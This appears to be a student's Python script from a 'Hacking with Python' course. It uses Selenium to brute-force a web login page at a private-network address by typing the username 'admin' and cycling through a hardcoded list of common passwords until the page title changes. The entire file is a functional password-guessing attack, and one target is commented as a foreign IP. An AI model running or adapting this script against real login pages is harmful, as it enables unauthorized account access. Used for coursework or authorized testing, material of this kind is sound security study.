# selenium eigentlich zum Testen von Webseiten aber auch Bruteforce mlg
# pip install selenium, webdriver
# https://googlechromelabs.github.io/chrome-for-testing/   Chrome Version 147.0.7727.102
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By 
import time
#from webdriver_manager.chrome import ChromeDriverManager

print("Selenium Bruteforce")
s = Service(executable_path=r"C:\Users\kevin\OneDrive\Desktop\6. Semester\Hacking with Python\chromedriver-win64\chromedriver.exe")
driver = webdriver.Chrome(service=s)

website1 = "http://141.87.56.119:5000/login" #localhost
website = "http://141.87.56.37:5000/login" #fremde IP
username = "admin"  #admin, de, tester1 
# wordlist verwenden - da hardware hier sehr begrenzt, wird wordlist mit array simuliert 
passwords = ["1234", "password", "de", "test","", "tester1", "password2026", "admin"]

print(f"Angriff an User: {username}")
driver.get(website)

for passw in passwords:
    driver.get(website)
    time.sleep(0.1)
    print("=======================")
    print(f"Trying Password: {passw}")

    res = driver.find_elements(By.CLASS_NAME, "form-control")

    print(f"Check {len(res)}")

    time.sleep(0.1)
    
    #res[0].clear()
    res[0].send_keys(username) 

    #res[1].clear()
    res[1].send_keys(passw)

    button = driver.find_elements(By.CLASS_NAME, "btn")
    print(f"Check 2 {len(button)}")

    button[0].click()

    print(f"Pagetitel: {driver.title}, try next Password...")
    if driver.title != "Login":
        print(f"Password found: {passw}")
        print(f"Username: {username}")
        break

driver.quit()